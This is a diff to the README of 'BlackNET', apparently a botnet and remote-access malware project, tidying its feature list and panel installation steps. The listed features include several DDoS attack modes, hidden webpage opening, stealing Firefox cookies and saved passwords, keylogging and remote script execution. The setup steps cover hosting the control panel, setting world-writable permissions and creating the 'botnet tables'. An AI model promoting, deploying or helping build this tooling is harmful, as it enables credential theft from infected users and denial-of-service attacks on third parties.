@@ -25,14 +25,16 @@ Developed By: Black.Hacker
  2. DDOS Attack [ TCP,UDP,ARME,Slowloris, HTTPGet, POSTHttp, Bandwidth Flood ]
     + Start DDOS
     + Stop DDOS
- 3. Open Webpage [Visiable, Hidden]
+ 3. Open Webpage
+     + Visiable
+     + Hidden
  4. Show MessageBox
  5. Take Screenshot
  6. Steal Firefox Cookies
  7. Steal Saved Passwords
  8. Keylogger
  9. Execute Scripts
-10. Computer Oprations
+10. Computer Operations
     + Restart
     + Shutdown
     + Logout
@@ -54,7 +56,7 @@ Developed By: Black.Hacker
 2. Compress BlackNET panel folder and upload it to your hosting
 3. Create a database with any name you want
 4. Change the data in classes/Database.php
-5. Change files and folders permission to 777 [ Uploads Folder]
+5. Change files and folders permission to 777 [ Uploads Folder, Scripts Folder ]
 6. Go to install.php to create the botnet tables automatically
 
 ## Screenshots
